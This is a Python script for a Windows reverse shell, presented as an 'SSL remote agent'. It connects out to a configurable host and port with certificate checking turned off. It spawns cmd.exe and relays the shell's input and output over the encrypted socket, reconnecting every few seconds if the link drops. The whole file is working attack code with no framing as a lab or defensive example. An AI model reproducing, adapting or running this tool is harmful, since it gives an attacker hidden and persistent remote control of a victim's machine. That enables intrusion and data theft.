import socket
import ssl
import subprocess
import threading
import time
import logging

# --- Configuration ---
LHOST = "127.0.0.1"
LPORT = 444
RECONNECT_DELAY = 5  # seconds
BUFFER_SIZE = 1024

# --- Logging Setup ---
logging.basicConfig(
    level=logging.INFO,
    format="[%(asctime)s] %(levelname)s: %(message)s"
)

def read_from_proc(proc, conn):
    """Continuously read from process stdout and send to socket"""
    try:
        while True:
            output = proc.stdout.readline()
            if output == "" and proc.poll() is not None:
                break
            if output:
                try:
                    conn.sendall(output.encode())
                except Exception:
                    break
    except Exception as e:
        logging.error(f"read_from_proc error: {e}")

def write_to_proc(proc, conn):
    """Continuously read from socket and write to process stdin"""
    try:
        while True:
            data = conn.recv(BUFFER_SIZE)
            if not data:
                break
            proc.stdin.write(data.decode(errors="ignore") + "\n")
            proc.stdin.flush()
    except Exception as e:
        logging.error(f"write_to_proc error: {e}")

def handle_connection(ssock):
    """Handle a single SSL connection with subprocess"""
    proc = subprocess.Popen(
        ["cmd.exe"],
        stdin=subprocess.PIPE,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        text=True,
        bufsize=1
    )
    
    reader_thread = threading.Thread(target=read_from_proc, args=(proc, ssock), daemon=True)
    reader_thread.start()

    write_to_proc(proc, ssock)

def connect():
    """Main loop to connect and reconnect to server"""
    context = ssl.create_default_context()
    context.check_hostname = False
    context.verify_mode = ssl.CERT_NONE

    while True:
        try:
            with socket.create_connection((LHOST, LPORT)) as sock:
                with context.wrap_socket(sock, server_hostname=LHOST) as ssock:
                    logging.info(f"[+] Connected to {LHOST}:{LPORT}")
                    ssock.send(b"[+] SSL session established\n")
                    handle_connection(ssock)
        except Exception as e:
            logging.warning(f"Connection failed: {e}, retrying in {RECONNECT_DELAY}s")
            time.sleep(RECONNECT_DELAY)

if __name__ == "__main__":
    logging.info("Starting SSL remote agent...")
    connect()